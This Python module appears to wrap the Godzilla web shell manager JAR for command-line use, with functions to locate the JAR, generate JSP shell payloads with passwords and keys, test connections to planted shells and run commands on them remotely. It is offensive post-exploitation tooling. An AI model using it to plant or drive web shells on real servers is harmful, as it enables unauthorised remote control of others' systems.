"""
Backend integration module for cli-anything-godzilla.

Provides functions to call the real Godzilla JAR and generate payloads,
execute commands, and manage profiles.
"""

import shutil
import subprocess
import os
import json
import tempfile
from pathlib import Path
from typing import Optional, Dict, List, Any
from datetime import datetime

# Try to import Godzilla-specific modules if available
try:
    from cli_anything.godzilla.core.shell import ShellEntity
except ImportError:
    ShellEntity = None


class GodzillaBackend:
    """Backend integration for calling the real Godzilla JAR."""

    def __init__(self, jar_path: Optional[str] = None):
        """Initialize with the Godzilla JAR path.

        Args:
            jar_path: Path to the Godzilla JAR file

        Raises:
            RuntimeError: If Java is not installed
        """
        self.jar_path = Path(jar_path) if jar_path else None
        self._java_path = shutil.which("java")

        if not self._java_path:
            raise RuntimeError(
                "Java is not installed. Install with:\n"
                "  apt install openjdk-11  # Ubuntu/Debian\n"
                "  brew install openjdk  # macOS"
            )

    def find_godzilla_jar(self) -> Optional[Path]:
        """Find Godzilla JAR in common locations.

        Returns:
            Path to JAR if found, None
        """
        common_locations = [
            "/tmp/哥斯拉402Godzilla/Godzilla15.jar",
            "/tmp/godzilla/Godzilla.jar",
            "/usr/local/godzilla/Godzilla.jar",
            "/Applications/Godzilla/Godzilla.jar",
            Path.home() / "Downloads" / "Godzilla.jar",
            Path.home() / "Godzilla" / "Godzilla.jar",
        ]

        for loc in common_locations:
            path = Path(loc)
            if path.exists() and path.is_file():
                return path

        return None

    def get_jar_path(self) -> Path:
        """Get the Godzilla JAR path, searching common locations if needed.

        Returns:
            Path to the Godzilla JAR file

        Raises:
            FileNotFoundError: If JAR file doesn't exist
        """
        if self.jar_path and self.jar_path.exists():
            return self.jar_path

        # Try to find it
        found_path = self.find_godzilla_jar()
        if found_path:
            self.jar_path = found_path
            return found_path

        raise FileNotFoundError(
            f"Godzilla JAR not found. Please specify with --jar option.\n"
            f"Searched locations:\n" +
            "\n".join(f"  - {loc}" for loc in [
                "/tmp/哥斯拉402Godzilla/Godzilla15.jar",
                "/usr/local/godzilla/Godzilla.jar",
                "~/Godzilla/Godzilla.jar"
            ])
        )

    def test_shell_connection(self, shell: "ShellEntity") -> Dict[str, Any]:
        """Test connectivity to a shell.

        Args:
            shell: ShellEntity to test

        Returns:
            Dictionary with test results
        """
        result = {
            "success": False,
            "shell_id": getattr(shell, 'id', 'unknown'),
            "url": getattr(shell, 'url', ''),
            "error": None,
            "response_time": None,
        }

        try:
            # Build command to test connection
            jar_path = self.get_jar_path()

            cmd = [
                self._java_path,
                "-jar", str(jar_path),
                "-t",  # Test mode
                "--url", shell.url,
                "--password", shell.password,
            ]

            start_time = datetime.now()

            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )

            end_time = datetime.now()
            result["response_time"] = str(end_time - start_time)

            if proc.returncode == 0:
                result["success"] = True
                result["output"] = proc.stdout
            else:
                result["error"] = proc.stderr or "Connection failed"

        except subprocess.TimeoutExpired:
            result["error"] = "Connection timeout (30s)"
        except FileNotFoundError as e:
            result["error"] = f"Godzilla JAR not found: {e}"
        except Exception as e:
            result["error"] = str(e)

        return result

    def generate_shell_payload(
        self,
        url: str,
        password: str,
        payload_type: str = "JavaDynamicPayload",
        secret_key: str = "",
        output_path: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Generate a shell payload file.

        Args:
            url: Shell URL
            password: Shell password
            payload_type: Type of payload to generate
            secret_key: Secret key for encryption
            output_path: Path to save the payload

        Returns:
            Dictionary with generation results
        """
        result = {
            "success": False,
            "url": url,
            "payload_type": payload_type,
            "output_path": None,
            "error": None,
        }

        try:
            jar_path = self.get_jar_path()

            # Create temp file if no output path specified
            if not output_path:
                fd, output_path = tempfile.mkstemp(suffix=".jsp")
                os.close(fd)

            cmd = [
                self._java_path,
                "-jar", str(jar_path),
                "-g",  # Generate mode
                "--url", url,
                "--password", password,
                "--payload", payload_type,
                "--output", output_path,
            ]

            if secret_key:
                cmd.extend(["--secret-key", secret_key])

            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
            )

            if proc.returncode == 0:
                result["success"] = True
                result["output_path"] = output_path
            else:
                result["error"] = proc.stderr or "Payload generation failed"

        except Exception as e:
            result["error"] = str(e)

        return result

    def execute_command(
        self,
        shell: "ShellEntity",
        command: str,
        args: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        """Execute a command on a remote shell.

        Args:
            shell: ShellEntity to execute on
            command: Command to execute
            args: Optional command arguments

        Returns:
            Dictionary with execution results
        """
        result = {
            "success": False,
            "shell_id": getattr(shell, 'id', 'unknown'),
            "command": command,
            "output": None,
            "error": None,
        }

        try:
            jar_path = self.get_jar_path()

            cmd = [
                self._java_path,
                "-jar", str(jar_path),
                "-e",  # Execute mode
                "--url", shell.url,
                "--password", shell.password,
                "--command", command,
            ]

            if args:
                for key, value in args.items():
                    cmd.extend([f"--{key}", value])

            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
            )

            if proc.returncode == 0:
                result["success"] = True
                result["output"] = proc.stdout
            else:
                result["error"] = proc.stderr or "Command execution failed"

        except Exception as e:
            result["error"] = str(e)

        return result


# Standalone functions for convenience

_backend: Optional[GodzillaBackend] = None


def get_backend(jar_path: Optional[str] = None) -> GodzillaBackend:
    """Get or create the Godzilla backend instance.

    Args:
        jar_path: Optional path to Godzilla JAR

    Returns:
        GodzillaBackend instance
    """
    global _backend
    if _backend is None:
        _backend = GodzillaBackend(jar_path)
    return _backend


def test_shell_connection(shell: "ShellEntity") -> Dict[str, Any]:
    """Test connectivity to a shell using the global backend.

    Args:
        shell: ShellEntity to test

    Returns:
        Dictionary with test results
    """
    return get_backend().test_shell_connection(shell)


def generate_shell_payload(
    url: str,
    password: str,
    payload_type: str = "JavaDynamicPayload",
    secret_key: str = "",
    output_path: Optional[str] = None,
) -> Dict[str, Any]:
    """Generate a shell payload file using the global backend.

    Args:
        url: Shell URL
        password: Shell password
        payload_type: Type of payload to generate
        secret_key: Secret key for encryption
        output_path: Path to save the payload

    Returns:
        Dictionary with generation results
    """
    return get_backend().generate_shell_payload(
        url, password, payload_type, secret_key, output_path
    )


def execute_command(
    shell: "ShellEntity",
    command: str,
    args: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    """Execute a command on a remote shell using the global backend.

    Args:
        shell: ShellEntity to execute on
        command: Command to execute
        args: Optional command arguments

    Returns:
        Dictionary with execution results
    """
    return get_backend().execute_command(shell, command, args)
